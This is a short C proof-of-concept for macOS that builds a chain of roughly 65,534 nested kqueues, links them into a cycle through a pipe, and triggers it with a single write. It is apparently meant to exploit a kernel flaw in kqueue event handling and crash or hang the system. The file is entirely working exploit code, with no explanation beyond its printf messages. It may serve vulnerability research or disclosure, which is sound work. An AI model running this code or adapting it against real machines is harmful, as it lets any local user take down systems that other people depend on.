/**
 * clang circular_queue.c -o circular_queue
 */
#include <errno.h>
#include <mach/mach.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/event.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    int kq_parent = 0, kq_child = 0;
    int pipe_fd[2];

    kq_parent = kqueue();
    kq_child = kqueue();
    if (kq_parent < 0 || kq_child < 0) {
        printf("[-] Init failed!\n");
        return 0;
    }

    struct kevent64_s kev;
    EV_SET64(&kev, kq_child, EVFILT_READ, EV_ADD, 0, 0, 0, 0, 0);
    int ret = kevent64(kq_parent, &kev, 1, NULL, 0, 0, NULL);
    if (ret < 0) {
        printf("[-] Add child failed, reason is \"%s\"", strerror(errno));
        return 0;
    }

#define MAX_QUEUE ((1 << 16) - 2)
    for (size_t i = 0; i < MAX_QUEUE; i++) {
        int temp = kq_child;
        kq_child = kq_parent;
        close(temp);
        kq_parent = kqueue();
        if (kq_parent < 0) {
            printf("[-] Create kqueue failed, reason is \"%s\"\n", strerror(errno));
            return 0;
        }

        EV_SET64(&kev, kq_child, EVFILT_READ, EV_ADD, 0, 0, 0, 0, 0);
        ret = kevent64(kq_parent, &kev, 1, NULL, 0, 0, NULL);
        if (ret < 0) {
            printf("[-] Add child failed, reason is \"%s\"\n", strerror(errno));
            return 0;
        }
        /*printf("[+] Round %lu\n", i);*/
    }

    if (pipe(pipe_fd) < 0) {
        printf("[-] Create pipe failed, reason is \"%s\"\n", strerror(errno));
        return 0;
    }
    EV_SET64(&kev, pipe_fd[0], EVFILT_READ, EV_ADD, 0, 0, 0, 0, 0);
    ret = kevent64(kq_child, &kev, 1, NULL, 0, 0, NULL);
    if (ret < 0) {
        printf("[-] Add pipe failed, reason is \"%s\"\n", strerror(errno));
        return 0;
    }

    EV_SET64(&kev, kq_parent, EVFILT_READ, EV_ADD, 0, 0, 0, 0, 0);
    ret = kevent64(kq_child, &kev, 1, NULL, 0, 0, NULL);
    if (ret < 0) {
        printf("[-] Make circular queue failed,  reason is \"%s\"\n", strerror(errno));
        return 0;
    }
    write(pipe_fd[1], "go", 2);

    return 0;
}
